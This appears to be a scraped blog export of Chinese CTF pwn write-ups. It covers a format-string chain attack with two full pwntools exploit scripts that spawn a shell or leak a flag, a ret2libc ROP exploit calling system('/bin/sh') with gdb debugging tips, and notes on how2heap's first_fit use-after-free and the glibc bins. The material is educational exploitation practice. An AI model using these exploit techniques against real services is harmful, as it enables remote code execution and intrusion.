io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(addr1+i,off0)) io.recv() io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(target_addr&amp;0xff,off1)) io.recv() target_addr=target_addr&gt;&gt;8 io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format(addr1,off0)) io.recv() 这里需要介绍一下one_gadget one-gadget 是glibc里调用execve(&#39;/bin/sh&#39;, NULL, NULL)的一段非常有用的gadget。在我们能够控制ip（也就是pc）的时候，用one-gadget来做RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用system(&quot;sh&quot;)，这个时候one gadget就可以搞定 再次运行write_address将0xfff566cc写上one_gadget地址 最后输入quit退出循环，执行return result时就能获取shell 由于我没拿到题目的libc，也没法真正的去做题所以大概就是先了解一下，借用一下别人的EXP 官方EXP，里面有很多很方便值得学习的格式化字符串函数可以学习一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *# context.log_level = \"debug\"do_fmt_ebp_offset = 6play_ebp_offset = 14main_ebp_offset = 26def format_offset(format_str , offset): return format_str.replace(\"&#123;&#125;\" , str(offset))def get_target_offset_value(offset , name): payload = format_offset(\"%&#123;&#125;$p\\x00\" , offset) p.sendline(payload) text = p.recv() try: value = int(text.split(\"\\n\")[0] , 16) print(name + \" : \" + hex(value)) return value except Exception, e: print textdef modify_last_byte(last_byte , offset): payload = \"%\" + str(last_byte) + \"c\" + format_offset(\"%&#123;&#125;$hhn\" , offset) p.sendline(payload) p.recv()def modify(addr , value , ebp_offset , ebp_1_offset): addr_last_byte = addr &amp; 0xff for i in range(4): now_value = (value &gt;&gt; i * 8) &amp; 0xff modify_last_byte(addr_last_byte + i , ebp_offset) modify_last_byte(now_value , ebp_1_offset)p = process(\"./playfmt\")elf = ELF(\"./playfmt\")p.recvuntil(\"=\\n\")p.recvuntil(\"=\\n\")# leak ebp_1_addr then get ebp_addrplay_ebp_addr = get_target_offset_value(do_fmt_ebp_offset, \"logo_ebp\") # get_ebp_addrmain_ebp_addr = get_target_offset_value(do_fmt_ebp_offset, \"main_ebp\")# flag_class_ptr_addr = main_ebp_addr + 0x10# flag_class_ptr_offset = main_ebp_offset - 4flag_class_ptr_offset = 19flag_addr = get_target_offset_value(flag_class_ptr_offset , \"flag_addr\") - 0x420log.info(hex(flag_addr))# puts_plt = elf.plt[\"puts\"]modify(main_ebp_addr + 4 , flag_addr , do_fmt_ebp_offset , play_ebp_offset)# gdb.attach(p)payload = format_offset(\"%&#123;&#125;$s\\x00\" , play_ebp_offset + 1)p.send(payload)# log.info(\"flag_addr : \" + hex(flag_addr))# p.sendline(\"quit\")p.interactive() 另一种EXP 1234567891011121314151617181920212223242526272829303132333435363738394041# coding=utf-8from pwn import *#io = remote('120.78.192.35', 9999)io = process(\"./playfmt\")elf = ELF('./playfmt')libc = ELF('/lib32/libc-2.23.so')#context.log_level = 'DEBUG'#gdb.attach(io,\"b *0x0804889f\")io.recv()io.sendline(\"%6$p%8$p\")io.recvuntil(\"0x\")stack_addr = int(io.recv(8),16)-0xffffd648+0xffffd610io.recvuntil(\"0x\")libc.address = int(io.recv(8),16)-0xf7e41000+0xf7c91000log.success(\"stack_addr:\"+hex(stack_addr))log.success(\"libc_addr:\"+hex(libc.address))io.recv()offset0=0x18/4offset1=0x38/4offset2=0x68/4def write_address(off0,off1,target_addr): io.sendline(\"%&#123;&#125;$p\".format(off1)) io.recvuntil(\"0x\") addr1 = int(io.recv(8),16)&amp;0xff io.recv() for i in range(4): io.sendline(\"%&#123;&#125;c%&#123;&#125;$hhn\".format(addr1+i,off0)) io.recv() io.sendline(\"%&#123;&#125;c%&#123;&#125;$hhn\".format(target_addr&amp;0xff,off1)) io.recv() target_addr=target_addr&gt;&gt;8 io.sendline(\"%&#123;&#125;c%&#123;&#125;$hhn\".format(addr1,off0)) io.recv()one_gadget = libc.address+ 0x5f065print(hex(one_gadget))write_address(offset0,offset1,stack_addr+0x1c)#gdb.attach(io,\"b *0x0804889f\")write_address(offset1,offset2,one_gadget)io.sendline(\"quit\")io.interactive() 注意：这里我特别强调一点，在单次printf操作中，是没有办法完成printf成链攻击的，因为单次printf时，一旦你对已经修改过的地址的值进行修改时，则要不就直接crash，要不就根本没反应，所以一定要多次printf才能完成该攻击方式。这是我自己尝试过的，然后单次就能完成printf成链攻击，那么这将是一个非常致命的漏洞 接下来简单说一下利用方式，printf成链攻击的实施一般至少需要两次printf才行（除非你运气好到爆棚，恰好有一个地址指向了函数的返回地址），第一次我们可以使栈数据链指向某个函数的返回地址，一般为了简单我们可以直接指向第二次printf的返回地址，由于栈布局是固定的，我们确实可以预测其返回地址。然后第二次printf操作时，便可以劫持其返回地址，然后重新返回main或者指向一个可以让printf复用的地址，然后我们就可以重复使用printf实现任意地址读写，这样就完成了一次printf成链攻击。 参考文章 【1】非栈上格式化字符串漏洞利用技巧 ：https://www.anquanke.com/post/id/184717 【2】printf 成链攻击 ：http://blog.eonew.cn/archives/1196","categories":[],"tags":[]},{"title":"EXP和调试的小坑-1","slug":"EXP║═╡≈╩╘╡─╨í┐╙-1","date":"2019-11-07T02:44:44.000Z","updated":"2019-11-07T18:45:24.000Z","comments":true,"path":"2019/11/06/EXP║═╡≈╩╘╡─╨í┐╙-1/","link":"","permalink":"http://yoursite.com/2019/11/06/EXP║═╡≈╩╘╡─╨í┐╙-1/","excerpt":"","text":"以NewbieCTF2019的dRop_the_beat为例子，记录了一下撰写EXP和调试的一些小坑和技巧 首先检测这个程序 1234567syc@ubuntu:~/Desktop/share/NewbieCTF/Pwnable/dRop_the_beat$ checksec drop_the_beat_easy[*] &apos;/mnt/hgfs/share/NewbieCTF/Pwnable/dRop_the_beat/drop_the_beat_easy&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 就只是开启了栈不可执行的保护，然后用IDA Pro打开查看一下源代码 12345678910111213141516171819202122232425262728293031int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+0h] [ebp-68h] char buf; // [esp+4h] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); puts(\" dP 888888ba .88888. 888888ba dP dP dP dP \"); puts(\" 88 88 `8b d8' `8b 88 `8b 88 88 88 88 \"); puts(\".d888b88 a88aaaa8P' 88 88 a88aaaa8P' d8888P 88d888b. .d8888b. 88d888b. .d8888b. .d8888b. d8888P \"); puts(\"88' `88 88 `8b. 88 88 88 88 88' `88 88ooood8 88' `88 88ooood8 88' `88 88 \"); puts(\"88. .88 88 88 Y8. .8P 88 88 88 88 88. ... 88. .88 88. ... 88. .88 88 \"); puts(\"`88888P8 dP dP `8888P' dP dP dP dP `88888P' 88Y8888' `88888P' `88888P8 dP \"); puts(\"oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo\"); puts(&amp;byte_80489F3); puts(\"dROP The beat(easy version)\"); puts(&amp;byte_80489F3); puts(\"1) Give Him a Beat!\"); puts(\"2) No Beat For You..!\"); __isoc99_scanf(\"%d\", &amp;v4); if ( v4 != 1 ) &#123; puts(\":( Sorry, You Can't be with us...\"); exit(1); &#125; puts(\"Give Me a Beat!!\"); read(0, &amp;buf, 0x12Cu); puts(&amp;buf); puts(\"Wow... That's AWESOME!\"); return 0;&#125; 很简单的栈溢出然后ROP的题目，大概思路就是暴露libc版本和地址即可，然后我写了一个错误的EXP 123456789101112131415161718from pwn import *p = process(\"./drop_the_beat_easy\",env=&#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;)elf = ELF('./drop_the_beat_easy')libc = ELF('./libc.so.6')#gdb.attach(p,\"b*0x08048672\")libc_start_main_got = elf.got['__libc_start_main']puts_plt = elf.plt['puts']main = elf.symbols['main']payload = \"A\"*104+p32(puts_plt)+p32(libc_start_main_got)+p32(main)p.recvuntil('2) No Beat For You..!\\n')p.sendline(\"1\")p.recvuntil('Give Me a Beat!!\\n')p.send(payload)p.recvuntil(\"Wow... That's AWESOME!\\n\")#info(p.recv())libc.address = u32(p.recv(4)) - libc.symbols['__libc_start_main']info(\"libc : \" + hex(libc.address))p.interactive() 我的payload写错了，应该是main作为函数的返回地址，libc作为第一个参数 1payload = \"A\"*104+p32(puts_plt)+p32(main)+p32(libc_start_main_got) 这里想说的是如何检查自己的payload是否书写正确，就是最后的返回地址EIP是否劫持成功，这里有一个下断点的小技巧，我们一般下在溢出函数后的一个leave指令处 例如这题的汇编代码 1234567891011121314151617181920.text:0804864F call _puts.text:08048654 add esp, 4.text:08048657 mov eax, 0.text:0804865C jmp short locret_8048672.text:0804865E ; ---------------------------------------------------------------------------.text:0804865E.text:0804865E loc_804865E: ; CODE XREF: main+E1↑j.text:0804865E push offset aSorryYouCanTBe ; \":( Sorry, You Can't be with us...\".text:08048663 call _puts.text:08048668 add esp, 4.text:0804866B push 1 ; status.text:0804866D call _exit.text:08048672 ; ---------------------------------------------------------------------------.text:08048672.text:08048672 locret_8048672: ; CODE XREF: main+121↑j.text:08048672 leave.text:08048673 retn.text:08048673 ; &#125; // starts at 804853B.text:08048673 main endp.text:08048673 我们就一般下在0x08048672处，然后开始调试一遍错误的payload 123456789101112131415161718192021222324252627────────────────────────────────────────────────────────────────────────────────────── registers ────$eax : 0x0 $ebx : 0x0 $ecx : 0xffffffff$edx : 0xf7ed9870 → 0x00000000$esp : 0xffd211ac → 0x080483e0 → &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010$ebp : 0x41414141 (\"AAAA\"?)$esi : 0xf7ed8000 → 0x001b1db0$edi : 0xf7ed8000 → 0x001b1db0$eip : 0x08048673 → &lt;main+312&gt; ret $eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ────────────────────────────────────────────────────────────────────────────────────────── stack ────0xffd211ac│+0x0000: 0x080483e0 → &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010 ← $esp0xffd211b0│+0x0004: 0x0804a018 → 0xf7d3e540 → &lt;__libc_start_main+0&gt; call 0xf7e45b59 &lt;__x86.get_pc_thunk.ax&gt;0xffd211b4│+0x0008: 0x0804853b → &lt;main+0&gt; push ebp0xffd211b8│+0x000c: 0xffd2124c → 0xffd2330d → \"QT_QPA_PLATFORMTHEME=appmenu-qt5\"0xffd211bc│+0x0010: 0x000000000xffd211c0│+0x0014: 0x000000000xffd211c4│+0x0018: 0x000000000xffd211c8│+0x001c: 0xf7ed8000 → 0x001b1db0──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ──── 0x8048667 &lt;main+300&gt; inc DWORD PTR [ebx+0x16a04c4] 0x804866d &lt;main+306&gt; call 0x80483f0 &lt;exit@plt&gt; 0x8048672 &lt;main+311&gt; leave → 0x8048673 &lt;main+312&gt; ret ↳ 0x80483e0 &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010 可以发现函数的返回地址是错误的，然后我们运行一遍正确的payload 12345678910111213141516171819202122232425262728293031$eax : 0x0 $ebx : 0x0 $ecx : 0xffffffff$edx : 0xf7f9a870 → 0x00000000$esp : 0xffddb3fc → 0x080483e0 → &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010$ebp : 0x41414141 (&quot;AAAA&quot;?)$esi : 0xf7f99000 → 0x001b1db0$edi : 0xf7f99000 → 0x001b1db0$eip : 0x08048673 → &lt;main+312&gt; ret $eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ────────────────────────────────────────────────────────────────────────────────────────── stack ────0xffddb3fc│+0x0000: 0x080483e0 → &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010 ← $esp0xffddb400│+0x0004: 0x0804853b → &lt;main+0&gt; push ebp0xffddb404│+0x0008: 0x0804a018 → 0xf7dff540 → &lt;__libc_start_main+0&gt; call 0xf7f06b59 &lt;__x86.get_pc_thunk.ax&gt;0xffddb408│+0x000c: 0xffddb49c → 0xffddd30d → &quot;QT_QPA_PLATFORMTHEME=appmenu-qt5&quot;0xffddb40c│+0x0010: 0x000000000xffddb410│+0x0014: 0x000000000xffddb414│+0x0018: 0x000000000xffddb418│+0x001c: 0xf7f99000 → 0x001b1db0──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ──── 0x8048667 &lt;main+300&gt; inc DWORD PTR [ebx+0x16a04c4] 0x804866d &lt;main+306&gt; call 0x80483f0 &lt;exit@plt&gt; 0x8048672 &lt;main+311&gt; leave → 0x8048673 &lt;main+312&gt; ret ↳ 0x80483e0 &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010 0x80483e6 &lt;puts@plt+6&gt; push 0x8 0x80483eb &lt;puts@plt+11&gt; jmp 0x80483c0 0x80483f0 &lt;exit@plt+0&gt; jmp DWORD PTR ds:0x804a014 0x80483f6 &lt;exit@plt+6&gt; push 0x10 0x80483fb &lt;exit@plt+11&gt; jmp 0x80483c0 可以发现返回地址正确了 总之第一点就是下断点可以下在leave处 还有就是在程序为完全静态编译没有调用动态库的时候也是可以知道一些相关的编译信息的 12strings ./binary_name | grep GCC确定Ubuntu多少版本和gcc版本 例如这题 12syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ strings ./drop_the_beat_easy | grep GCCGCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609 还有一个命令是可以查看当前程序的动态加载库 1ldd 1234syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ ldd ./drop_the_beat_easy linux-gate.so.1 =&gt; (0xf7f18000) libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d41000) /lib/ld-linux.so.2 (0xf7f1a000) 然后在题目给了libc的情况下，我们的程序如果没有经过修改就运行的话，调用的是我们本机的libc库，所以我们需要修改他的动态加载库 在写exp的时候可以这样写 1p = process(&quot;./drop_the_beat_easy&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;) 后面的env就是动态加载库的文件 我们还可以通过安装 patchelf 来直接重定位软件的动态加载库 1patchelf --set-interpreter /mnt/hgfs/shared/multi_version_ld/ld-2.23_x86-64.so.2 ./babystack patchelf 的更多命令还是通过help进行查看 1234567891011121314151617181920syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ patchelf --helpsyntax: patchelf [--set-interpreter FILENAME] [--page-size SIZE] [--print-interpreter] [--print-soname] Prints 'DT_SONAME' entry of .dynamic section. Raises an error if DT_SONAME doesn't exist [--set-soname SONAME] Sets 'DT_SONAME' entry to SONAME. [--set-rpath RPATH] [--remove-rpath] [--shrink-rpath] [--print-rpath] [--force-rpath] [--add-needed LIBRARY] [--remove-needed LIBRARY] [--replace-needed LIBRARY NEW_LIBRARY] [--print-needed] [--no-default-lib] [--debug] [--version] FILENAME 还有就是接受的问题，有时候接受可能会多一个或者少一个换行符，可以先用recv一次全部查看一下接受的内容 最后最终的EXP就是 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *p = process(\"./drop_the_beat_easy\",env=&#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;)elf = ELF('./drop_the_beat_easy')libc = ELF('./libc.so.6')#gdb.attach(p,\"b*0x08048672\")libc_start_main_got = elf.got['__libc_start_main']puts_plt = elf.plt['puts']main = elf.symbols['main']print hex(main)print hex(puts_plt)payload = \"A\"*104+p32(puts_plt)+p32(main)+p32(libc_start_main_got)p.recvuntil('2) No Beat For You..!\\n')p.sendline(\"1\")p.recvuntil('Give Me a Beat!!\\n')p.send(payload)p.recvuntil(\"Wow... That's AWESOME!\\n\")#info(p.recv())libc.address = u32(p.recv(4)) - libc.symbols['__libc_start_main']info(\"libc : \" + hex(libc.address))print hex(libc.symbols[\"system\"])print hex(libc.search(\"/bin/sh\\x00\").next())payload = \"A\"*104+p32(libc.symbols[\"system\"])*2+p32(libc.search(\"/bin/sh\\x00\").next())p.recvuntil('2) No Beat For You..!\\n')p.sendline(\"1\")p.recvuntil('Give Me a Beat!!\\n')p.send(payload)p.interactive() 还有就是可以在 /usr/include/asm/unistd_32.h直接查看32位系统的系统调用号，配合grep效果更好 123syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ cat /usr/include/asm/unistd_64.h | grep execve#define __NR_execve 59#define __NR_execveat 322 还有就是熟练使用ROPgadget生成ROP chain","categories":[],"tags":[]},{"title":"how2heap笔记0x01","slug":"how2heap▒╩╝╟0x01","date":"2019-10-30T15:43:45.000Z","updated":"2019-10-31T06:44:22.000Z","comments":true,"path":"2019/10/30/how2heap▒╩╝╟0x01/","link":"","permalink":"http://yoursite.com/2019/10/30/how2heap▒╩╝╟0x01/","excerpt":"","text":"how2heap是shellphish团队在Github上开源的堆漏洞系列教程，地址链接:https://github.com/shellphish/how2heap File Technique Glibc-Version Applicable CTF Challenges first_fit.c Demonstrating glibc malloc’s first-fit behavior. fastbin_dup.c Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist. fastbin_dup_into_stack.c Tricking malloc into returning a nearly-arbitrary pointer by abusing the fastbin freelist. latest 9447-search-engine, 0ctf 2017-babyheap fastbin_dup_consolidate.c Tricking malloc into returning an already-allocated heap pointer by putting a pointer on both fastbin freelist and unsorted bin freelist. latest Hitcon 2016 SleepyHolder unsafe_unlink.c Exploiting free on a corrupted chunk to get arbitrary write. &lt; 2.26 HITCON CTF 2014-stkof, Insomni’hack 2017-Wheel of Robots house_of_spirit.c Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer. latest hack.lu CTF 2014-OREO poison_null_byte.c Exploiting a single null byte overflow. &lt; 2.26 PlaidCTF 2015-plaiddb house_of_lore.c Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist. &lt; 2.26 overlapping_chunks.c Exploit the overwrite of a freed chunk size in the unsorted bin in order to make a new allocation overlap with an existing chunk &lt; 2.26 hack.lu CTF 2015-bookstore, Nuit du Hack 2016-night-deamonic-heap overlapping_chunks_2.c Exploit the overwrite of an in use chunk size in order to make a new allocation overlap with an existing chunk latest house_of_force.c Exploiting the Top Chunk (Wilderness) header in order to get malloc to return a nearly-arbitrary pointer &lt; 2.29 Boston Key Party 2016-cookbook, BCTF 2016-bcloud unsorted_bin_into_stack.c Exploiting the overwrite of a freed chunk on unsorted bin freelist to return a nearly-arbitrary pointer. &lt; 2.26 unsorted_bin_attack.c Exploiting the overwrite of a freed chunk on unsorted bin freelist to write a large value into arbitrary address &lt; 2.28 0ctf 2016-zerostorage large_bin_attack.c Exploiting the overwrite of a freed chunk on large bin freelist to write a large value into arbitrary address &lt; 2.26 0ctf 2018-heapstorm2 house_of_einherjar.c Exploiting a single null byte overflow to trick malloc into returning a controlled pointer &lt; 2.26 Seccon 2016-tinypad house_of_orange.c Exploiting the Top Chunk (Wilderness) in order to gain arbitrary code execution &lt; 2.26 Hitcon 2016 houseoforange tcache_dup.c Tricking malloc into returning an already-allocated heap pointer by abusing the tcache freelist. 2.26 - 2.28 tcache_poisoning.c Tricking malloc into returning a completely arbitrary pointer by abusing the tcache freelist. &gt; 2.25 tcache_house_of_spirit.c Frees a fake chunk to get malloc to return a nearly-arbitrary pointer. &gt; 2.25 0x01 first_fit源代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; fprintf(stderr, \"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\\n\"); //这个程序并不展示如何攻击,而是展示glibc的一种分配规则. fprintf(stderr, \"glibc uses a first-fit algorithm to select a free chunk.\\n\"); //glibc使用一种first-fit算法去选择一个free-chunk. fprintf(stderr, \"If a chunk is free and large enough, malloc will select this chunk.\\n\"); //如果存在一个free-chunk并且足够大的话,malloc会优先选取这个chunk. fprintf(stderr, \"This can be exploited in a use-after-free situation.\\n\"); //这种机制就可以在被利用于use after free的情形中. fprintf(stderr, \"Allocating 2 buffers. They can be large, don't have to be fastbin.\\n\"); //先分配两个buffer,可以分配大一点,是不是fastbin也无所谓. char* a = malloc(512); char* b = malloc(256); char* c; fprintf(stderr, \"1st malloc(512): %p\\n\", a); fprintf(stderr, \"2nd malloc(256): %p\\n\", b); fprintf(stderr, \"we could continue mallocing here...\\n\"); //我们也可以继续分配… fprintf(stderr, \"now let's put a string at a that we can read later \\\"this is A!\\\"\\n\"); //为了方便展示如何利用这个机制,我们在这里放置一个字符串 “this is A!” strcpy(a, \"this is A!\"); fprintf(stderr, \"first allocation %p points to %s\\n\", a, a); //我们使第一个分配的内存空间的地址指向这个字符串”this is A!”. fprintf(stderr, \"Freeing the first one...\\n\"); //然后free掉这块内存… free(a); fprintf(stderr, \"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\\n\", a); //我们也不需要free其他内存块了.之后只要我们用malloc申请的内存大小小于第一块的512字节,都会给我们返回第一个内存块开始的地址 fprintf(stderr, \"So, let's allocate 500 bytes\\n\"); //ok,我们现在开始用malloc申请500个字节试试. c = malloc(500); fprintf(stderr, \"3rd malloc(500): %p\\n\", c); fprintf(stderr, \"And put a different string here, \\\"this is C!\\\"\\n\"); //然后我们在这个地方放置一个不同的字符串 “this is C!” strcpy(c, \"this is C!\"); fprintf(stderr, \"3rd allocation %p points to %s\\n\", c, c); //第三个返回的内存块的地址 0x662420 指向了这个字符串 “this is C!”. fprintf(stderr, \"first allocation %p points to %s\\n\", a, a); //第一个返回的内存块的地址也指向这个字符串! fprintf(stderr, \"If we reuse the first allocation, it now holds the data from the third allocation.\\n\");&#125; //如果我们重新使用了第一次分配的内存空间，现在里面存储的是第三次分配的数据 这个程序的意思就是我们在申请了第一次内存地址后，Free掉再申请一次的话，得到了之前分配得到的内存地址，运行效果 12345678910111213141516171819202122232425262728293031323334353637syc@ubuntu:~/Downloads/tmp$ ./a.out This file doesn't demonstrate an attack, but shows the nature of glibc's allocator. glibc uses a first-fit algorithm to select a free chunk. If a chunk is free and large enough, malloc will select this chunk. This can be exploited in a use-after-free situation. Allocating 2 buffers. They can be large, don't have to be fastbin. 1st malloc(512): 0x85bf008 2nd malloc(256): 0x85bf210 we could continue mallocing here... now let's put a string at a that we can read later \"this is A!\" first allocation 0x85bf008 points to this is A! Freeing the first one... We don't need to free anything again. As long as we allocate less than 512, it will end up at 0x85bf008 So, let's allocate 500 bytes 3rd malloc(500): 0x85bf008 And put a different string here, \"this is C!\" 3rd allocation 0x85bf008 points to this is C! first allocation 0x85bf008 points to this is C! If we reuse the first allocation, it now holds the data from the third allocation. 从这里 121st malloc(512): 0x85bf0083rd malloc(500): 0x85bf008 我们可以发现两个指针指向了同一个地址 然后我们在GDB里面逐步分析，第一次malloc 12345678910 0x804854c &lt;main+129&gt; add esp, 0x10 0x804854f &lt;main+132&gt; sub esp, 0xc 0x8048552 &lt;main+135&gt; push 0x200→ 0x8048557 &lt;main+140&gt; call 0x8048390 &lt;malloc@plt&gt; ↳ 0x8048390 &lt;malloc@plt+0&gt; jmp DWORD PTR ds:0x804a014 0x8048396 &lt;malloc@plt+6&gt; push 0x10 0x804839b &lt;malloc@plt+11&gt; jmp 0x8048360 0x80483a0 &lt;__libc_start_main@plt+0&gt; jmp DWORD PTR ds:0x804a018 0x80483a6 &lt;__libc_start_main@plt+6&gt; push 0x18 0x80483ab &lt;__libc_start_main@plt+11&gt; jmp 0x8048360 返回的Chunk地址就在EAX寄存器里面 1234567891011$eax : 0x0804b008 → 0x00000000$ebx : 0x0 $ecx : 0xf7fb2780 → 0x00000000$edx : 0x0804b008 → 0x00000000$esp : 0xffffd040 → 0x00000200$ebp : 0xffffd068 → 0x00000000$esi : 0xf7fb2000 → 0x001b1db0$edi : 0xf7fb2000 → 0x001b1db0$eip : 0x0804855c → &lt;main+145&gt; add esp, 0x10$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 12345678gef➤ heap chunk 0x0804b008Chunk(addr=0x804b008, size=0x208, flags=PREV_INUSE)Chunk size: 520 (0x208)Usable size: 516 (0x204)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 下一次malloc地址 123456→ 14 char* b = malloc(256); 15 char* c; 16 17 fprintf(stderr, \"1st malloc(512): %p\\n\", a); 18 fprintf(stderr, \"2nd malloc(256): %p\\n\", b); 19 fprintf(stderr, \"we could continue mallocing here...\\n\"); 123456780xffffd040│+0x0000: 0x0804b008 → \"this is A!\" ← $esp0xffffd044│+0x0004: 0x000000010xffffd048│+0x0008: 0x000000190xffffd04c│+0x000c: 0xf7fb2cc0 → 0xfbad28870xffffd050│+0x0010: 0x000000010xffffd054│+0x0014: 0x0804b008 → \"this is A!\"0xffffd058│+0x0018: 0x0804b210 → 0x000000000xffffd05c│+0x001c: 0x08048731 → &lt;__libc_csu_init+33&gt; lea eax, [ebx-0xf8] 12345678gef➤ heap chunk 0x0804b008Chunk(addr=0x804b008, size=0x208, flags=PREV_INUSE)Chunk size: 520 (0x208)Usable size: 516 (0x204)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 第三次malloc 12345678gef➤ heap chunk 0x0804b008Chunk(addr=0x804b008, size=0x1f8, flags=PREV_INUSE)Chunk size: 504 (0x1f8)Usable size: 500 (0x1f4)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer（ 悬空指针 ） 野指针(wild pointer)就是没有被初始化过的指针， 悬空指针是指针最初指向的内存已经被释放了的一种指针 无论是野指针还是悬空指针，都是指向无效内存区域(这里的无效指的是”不安全不可控”)的指针。 访问”不安全可控”(invalid)的内存区域将导致”Undefined Behavior“ 在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。 非常有意思的是，无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。 用户 free 掉的内存并不是都会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区中空闲的 chunk，当用户进行下一次分配请求时，ptmalloc 会在空闲的 chunk 中选择一个合适的分配给他，这样就避免了频繁地系统调用 ptmalloc 把大小相似的 chunk，用双向链表连接起来，这样就形成了一个 bin。ptmalloc 一共维护了 128 个这样的 bin，并使用数组来存储这些 bin 如下： Fast Bin 默认情况下（32 位系统为例）， fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是其可以支持的 chunk 的数据空间最大为 80 字节。除此之外， fastbin 最多可以支持的 bin 的个数为 10 个，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是数据空间大小，也即除去 prev_size 和 size 字段部分的大小）定义如下 用户很有可能请求小的内存，而且释放之后也很可能再次请求小内存。所以合并释放小内存，并不明智。在 fast bins 中，不大于 max_fast （默认值为 64B）的 chunk 被释放后，首先会被放到 fast bins 中，fast bins 中的 chunk 并不改变它的使用标志 P。这样也就无法将它们合并，当需要给用户分配的 chunk 小于或等于 max_fast 时，ptmalloc 首先会在 fast bins 中查找相应的空闲块，如果找不到，才会去 bins（那个数组）中查找数据块。 在某个特定的时刻，ptmalloc 会遍历整个 fast bins 将相邻的空闲 chunk 进行合并，并将合并后的 chunk 加入 unsorted bin 中，再加入到其他的 bin 中 Unsorted Bin如果被用户释放的 chunk 或在 fast bins 中合并的 chunk 大于 max_fast，则 ptmalloc 会把这些 chunk 放入 unsorted bin 中。在查找合适的 chunk 的时候，首先在 unsorted bin 中查找合适的空闲 chunk，然后才查找 bins。 如果 unsorted bin 中没有合适的 chunk，则会把 unsorted bin 中的 chunk 加入到 bins 的其他 bin 中，再进行查找 Small Bin数组中的第一个bin是 unsorted bin，数组中从第 2 个到第 64 个 bin 是 small bin,它的 chunk size 依次递增 8bytes，每个small bin中的chunk大小相同。 small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下 下标 SIZE_SZ=4（32 位） SIZE_SZ=8（64 位） 2 16 32 3 24 48 4 32 64 5 40 80 x 24x 28x 63 504 1008 small bin 是一个双向链表。双向链表不是循环链表，它是有顺序的。在相同大小 chunk 的 bin 中 的排序是按照「最近使用」的顺序，也就是说，排在后面的最容易被选中，刚被释放的放在前面 Large Binsmall bin 后面是 large bin，largin bin中 chunk 的大小不是固定的，而是有一个范围。其中的顺序是按大小排序的，越大的放在越下面，如果大小相同，按照「最近使用」的顺序， large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 